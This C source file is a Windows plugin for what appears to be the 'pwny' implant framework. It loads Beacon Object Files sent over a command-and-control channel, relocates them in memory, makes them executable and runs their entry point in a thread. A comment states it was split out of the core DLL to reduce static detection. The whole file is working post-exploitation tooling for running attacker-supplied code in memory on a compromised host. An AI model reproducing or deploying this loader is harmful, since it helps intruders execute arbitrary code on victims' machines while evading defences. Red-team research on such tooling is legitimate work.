/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * BOF (Beacon Object File) / COFF loader tab plugin.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a tab DLL via pe_load().
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <pwny/c2.h>
#include <pwny/log.h>

#define BOF_BASE 33

#define BOF_EXECUTE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       BOF_BASE, \
                       API_CALL)

/* ---- Minimal COFF structures (x86-64 PE/COFF) ---- */

#pragma pack(push, 1)

typedef struct
{
    UINT16 Machine;
    UINT16 NumberOfSections;
    UINT32 TimeDateStamp;
    UINT32 PointerToSymbolTable;
    UINT32 NumberOfSymbols;
    UINT16 SizeOfOptionalHeader;
    UINT16 Characteristics;
} coff_file_header_t;

typedef struct
{
    char   Name[8];
    UINT32 VirtualSize;
    UINT32 VirtualAddress;
    UINT32 SizeOfRawData;
    UINT32 PointerToRawData;
    UINT32 PointerToRelocations;
    UINT32 PointerToLinenumbers;
    UINT16 NumberOfRelocations;
    UINT16 NumberOfLinenumbers;
    UINT32 Characteristics;
} coff_section_header_t;

typedef struct
{
    union
    {
        char ShortName[8];
        struct
        {
            UINT32 Zeros;
            UINT32 Offset;
        } LongName;
    } Name;
    UINT32 Value;
    UINT16 SectionNumber;
    UINT16 Type;
    UINT8  StorageClass;
    UINT8  NumberOfAuxSymbols;
} coff_symbol_t;

typedef struct
{
    UINT32 VirtualAddress;
    UINT32 SymbolTableIndex;
    UINT16 Type;
} coff_reloc_t;

#pragma pack(pop)

/* AMD64 relocation types */
#ifndef IMAGE_REL_AMD64_ADDR64
#define IMAGE_REL_AMD64_ADDR64  0x0001
#endif
#ifndef IMAGE_REL_AMD64_ADDR32NB
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#endif
#ifndef IMAGE_REL_AMD64_REL32
#define IMAGE_REL_AMD64_REL32   0x0004
#endif
#ifndef IMAGE_REL_AMD64_REL32_1
#define IMAGE_REL_AMD64_REL32_1 0x0005
#endif
#ifndef IMAGE_REL_AMD64_REL32_2
#define IMAGE_REL_AMD64_REL32_2 0x0006
#endif
#ifndef IMAGE_REL_AMD64_REL32_3
#define IMAGE_REL_AMD64_REL32_3 0x0007
#endif
#ifndef IMAGE_REL_AMD64_REL32_4
#define IMAGE_REL_AMD64_REL32_4 0x0008
#endif
#ifndef IMAGE_REL_AMD64_REL32_5
#define IMAGE_REL_AMD64_REL32_5 0x0009
#endif

#ifndef IMAGE_SCN_CNT_CODE
#define IMAGE_SCN_CNT_CODE              0x00000020
#endif
#ifndef IMAGE_SCN_CNT_INITIALIZED_DATA
#define IMAGE_SCN_CNT_INITIALIZED_DATA  0x00000040
#endif
#ifndef IMAGE_SCN_CNT_UNINITIALIZED_DATA
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080
#endif

#ifndef IMAGE_SYM_CLASS_EXTERNAL
#define IMAGE_SYM_CLASS_EXTERNAL 2
#endif
#ifndef IMAGE_SYM_CLASS_STATIC
#define IMAGE_SYM_CLASS_STATIC   3
#endif
#ifndef IMAGE_SYM_CLASS_SECTION
#define IMAGE_SYM_CLASS_SECTION  104
#endif

/* ---- BOF context ---- */

typedef struct
{
    unsigned char *raw;
    UINT32 raw_size;

    coff_file_header_t *header;
    coff_section_header_t *sections;
    coff_symbol_t *symbols;
    char *string_table;

    unsigned char **section_map;

    void **func_map;
    int func_count;
} bof_ctx_t;

static const char *bof_get_symbol_name(bof_ctx_t *ctx, coff_symbol_t *sym)
{
    if (sym->Name.LongName.Zeros == 0)
    {
        return ctx->string_table + sym->Name.LongName.Offset;
    }

    return sym->Name.ShortName;
}

static void *bof_resolve_external(const char *name)
{
    const char *sep;
    char module_name[128];
    HMODULE hMod;

    sep = strchr(name, '$');
    if (sep == NULL)
    {
        void *addr = (void *)GetProcAddress(GetModuleHandleA("kernel32.dll"), name);
        if (addr)
        {
            return addr;
        }
        addr = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), name);
        return addr;
    }

    {
        size_t mod_len = (size_t)(sep - name);

        if (mod_len >= sizeof(module_name) - 5)
        {
            return NULL;
        }

        memcpy(module_name, name, mod_len);
        module_name[mod_len] = '\0';

        if (strstr(module_name, ".") == NULL)
        {
            strcat(module_name, ".dll");
        }
    }

    hMod = GetModuleHandleA(module_name);
    if (hMod == NULL)
    {
        hMod = LoadLibraryA(module_name);
    }

    if (hMod == NULL)
    {
        log_debug("* bof: cannot load module %s\n", module_name);
        return NULL;
    }

    return (void *)GetProcAddress(hMod, sep + 1);
}

static int bof_load(bof_ctx_t *ctx, unsigned char *data, UINT32 size)
{
    UINT32 i;

    memset(ctx, 0, sizeof(*ctx));
    ctx->raw = data;
    ctx->raw_size = size;

    if (size < sizeof(coff_file_header_t))
    {
        log_debug("* bof: file too small\n");
        return -1;
    }

    ctx->header = (coff_file_header_t *)data;

    if (ctx->header->Machine != 0x8664)
    {
        log_debug("* bof: unsupported machine 0x%x (need AMD64)\n",
                  ctx->header->Machine);
        return -1;
    }

    ctx->sections = (coff_section_header_t *)(data + sizeof(coff_file_header_t) +
                     ctx->header->SizeOfOptionalHeader);

    ctx->symbols = (coff_symbol_t *)(data + ctx->header->PointerToSymbolTable);

    ctx->string_table = (char *)(ctx->symbols + ctx->header->NumberOfSymbols);

    ctx->section_map = (unsigned char **)calloc(
        ctx->header->NumberOfSections, sizeof(unsigned char *));

    if (ctx->section_map == NULL)
    {
        return -1;
    }

    for (i = 0; i < ctx->header->NumberOfSections; i++)
    {
        coff_section_header_t *sec = &ctx->sections[i];
        UINT32 alloc_size;

        alloc_size = sec->SizeOfRawData;
        if (sec->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)
        {
            alloc_size = sec->VirtualSize > 0 ? sec->VirtualSize : sec->SizeOfRawData;
        }

        if (alloc_size == 0)
        {
            alloc_size = 16;
        }

        ctx->section_map[i] = (unsigned char *)VirtualAlloc(
            NULL, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (ctx->section_map[i] == NULL)
        {
            log_debug("* bof: VirtualAlloc failed for section %d\n", i);
            return -1;
        }

        memset(ctx->section_map[i], 0, alloc_size);

        if (sec->SizeOfRawData > 0 && sec->PointerToRawData > 0)
        {
            if (sec->PointerToRawData + sec->SizeOfRawData > size)
            {
                log_debug("* bof: section %d raw data out of bounds\n", i);
                return -1;
            }

            memcpy(ctx->section_map[i],
                   data + sec->PointerToRawData,
                   sec->SizeOfRawData);
        }
    }

    return 0;
}

static int bof_relocate(bof_ctx_t *ctx)
{
    UINT32 i, j;

    for (i = 0; i < ctx->header->NumberOfSections; i++)
    {
        coff_section_header_t *sec = &ctx->sections[i];
        coff_reloc_t *relocs;

        if (sec->NumberOfRelocations == 0)
        {
            continue;
        }

        if (sec->PointerToRelocations + sec->NumberOfRelocations * sizeof(coff_reloc_t) >
            ctx->raw_size)
        {
            log_debug("* bof: relocation table out of bounds for section %d\n", i);
            return -1;
        }

        relocs = (coff_reloc_t *)(ctx->raw + sec->PointerToRelocations);

        for (j = 0; j < sec->NumberOfRelocations; j++)
        {
            coff_reloc_t *rel = &relocs[j];
            coff_symbol_t *sym;
            unsigned char *patch_addr;
            UINT64 sym_addr;

            if (rel->SymbolTableIndex >= ctx->header->NumberOfSymbols)
            {
                log_debug("* bof: reloc symbol index out of range\n");
                return -1;
            }

            sym = &ctx->symbols[rel->SymbolTableIndex];
            patch_addr = ctx->section_map[i] + rel->VirtualAddress;

            if (sym->SectionNumber > 0)
            {
                UINT16 sec_idx = sym->SectionNumber - 1;

                if (sec_idx >= ctx->header->NumberOfSections)
                {
                    log_debug("* bof: bad section number for symbol\n");
                    return -1;
                }

                sym_addr = (UINT64)(uintptr_t)(ctx->section_map[sec_idx] + sym->Value);
            }
            else if (sym->SectionNumber == 0 &&
                     sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL)
            {
                const char *name = bof_get_symbol_name(ctx, sym);
                void *addr;

                if (strncmp(name, "__imp_", 6) == 0)
                {
                    name += 6;
                }

                addr = bof_resolve_external(name);
                if (addr == NULL)
                {
                    log_debug("* bof: unresolved external: %s\n", name);
                    return -1;
                }

                sym_addr = (UINT64)(uintptr_t)addr;
            }
            else
            {
                log_debug("* bof: unhandled symbol section %d class %d\n",
                          sym->SectionNumber, sym->StorageClass);
                continue;
            }

            switch (rel->Type)
            {
                case IMAGE_REL_AMD64_ADDR64:
                    *(UINT64 *)patch_addr += sym_addr;
                    break;

                case IMAGE_REL_AMD64_ADDR32NB:
                    *(UINT32 *)patch_addr += (UINT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 4);
                    break;

                case IMAGE_REL_AMD64_REL32:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 4);
                    break;

                case IMAGE_REL_AMD64_REL32_1:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 5);
                    break;

                case IMAGE_REL_AMD64_REL32_2:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 6);
                    break;

                case IMAGE_REL_AMD64_REL32_3:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 7);
                    break;

                case IMAGE_REL_AMD64_REL32_4:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 8);
                    break;

                case IMAGE_REL_AMD64_REL32_5:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 9);
                    break;

                default:
                    log_debug("* bof: unsupported reloc type 0x%x\n", rel->Type);
                    return -1;
            }
        }
    }

    /* Set code sections to executable */
    for (i = 0; i < ctx->header->NumberOfSections; i++)
    {
        coff_section_header_t *sec = &ctx->sections[i];

        if (sec->Characteristics & IMAGE_SCN_CNT_CODE)
        {
            DWORD old;
            UINT32 sz = sec->SizeOfRawData > 0 ? sec->SizeOfRawData : 16;

            VirtualProtect(ctx->section_map[i], sz,
                           PAGE_EXECUTE_READ, &old);
        }
    }

    return 0;
}

typedef void (*bof_entry_t)(char *, int);

static void *bof_find_entry(bof_ctx_t *ctx)
{
    UINT32 i;

    for (i = 0; i < ctx->header->NumberOfSymbols; i++)
    {
        coff_symbol_t *sym = &ctx->symbols[i];
        const char *name;

        if (sym->SectionNumber <= 0)
        {
            i += sym->NumberOfAuxSymbols;
            continue;
        }

        name = bof_get_symbol_name(ctx, sym);

        if (strcmp(name, "go") == 0 || strcmp(name, "_go") == 0)
        {
            UINT16 sec_idx = sym->SectionNumber - 1;

            if (sec_idx >= ctx->header->NumberOfSections)
            {
                return NULL;
            }

            return (void *)(ctx->section_map[sec_idx] + sym->Value);
        }

        i += sym->NumberOfAuxSymbols;
    }

    return NULL;
}

static void bof_cleanup(bof_ctx_t *ctx)
{
    UINT32 i;

    if (ctx->section_map != NULL)
    {
        for (i = 0; i < ctx->header->NumberOfSections; i++)
        {
            if (ctx->section_map[i] != NULL)
            {
                VirtualFree(ctx->section_map[i], 0, MEM_RELEASE);
            }
        }

        free(ctx->section_map);
    }

    if (ctx->func_map)
    {
        free(ctx->func_map);
    }
}

/* ---- BOF thread wrapper ---- */

typedef struct
{
    bof_entry_t fn;
    char *args;
    int alen;
} bof_thread_ctx_t;

static DWORD WINAPI bof_thread_proc(LPVOID param)
{
    bof_thread_ctx_t *tc = (bof_thread_ctx_t *)param;
    tc->fn(tc->args, tc->alen);
    return 0;
}

static tlv_pkt_t *bof_execute(c2_t *c2)
{
    int obj_size;
    unsigned char *obj_data = NULL;
    unsigned char *args_data = NULL;
    int args_size;

    bof_ctx_t ctx;
    bof_entry_t entry;
    tlv_pkt_t *result;

    obj_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &obj_data);
    if (obj_size <= 0 || obj_data == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    args_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES + 1, &args_data);
    if (args_size < 0)
    {
        args_size = 0;
    }

    if (bof_load(&ctx, obj_data, (UINT32)obj_size) != 0)
    {
        log_debug("* bof: load failed\n");
        free(obj_data);
        if (args_data) free(args_data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (bof_relocate(&ctx) != 0)
    {
        log_debug("* bof: relocation failed\n");
        bof_cleanup(&ctx);
        free(obj_data);
        if (args_data) free(args_data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    entry = (bof_entry_t)bof_find_entry(&ctx);
    if (entry == NULL)
    {
        log_debug("* bof: entry point 'go' not found\n");
        bof_cleanup(&ctx);
        free(obj_data);
        if (args_data) free(args_data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    log_debug("* bof: executing entry at %p\n", (void *)entry);

    {
        bof_thread_ctx_t tc;
        HANDLE hThread;
        DWORD wait_result;

        tc.fn = entry;
        tc.args = (char *)args_data;
        tc.alen = args_size;

        hThread = CreateThread(NULL, 0, bof_thread_proc, &tc, 0, NULL);
        if (hThread == NULL)
        {
            log_debug("* bof: CreateThread failed\n");
            bof_cleanup(&ctx);
            free(obj_data);
            if (args_data) free(args_data);
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        }

        wait_result = WaitForSingleObject(hThread, 60000);
        CloseHandle(hThread);

        if (wait_result == WAIT_TIMEOUT)
        {
            log_debug("* bof: execution timed out\n");
            bof_cleanup(&ctx);
            free(obj_data);
            if (args_data) free(args_data);
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        }
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    bof_cleanup(&ctx);
    free(obj_data);
    if (args_data) free(args_data);

    return result;
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, BOF_EXECUTE, (api_t)bof_execute);
}

#endif
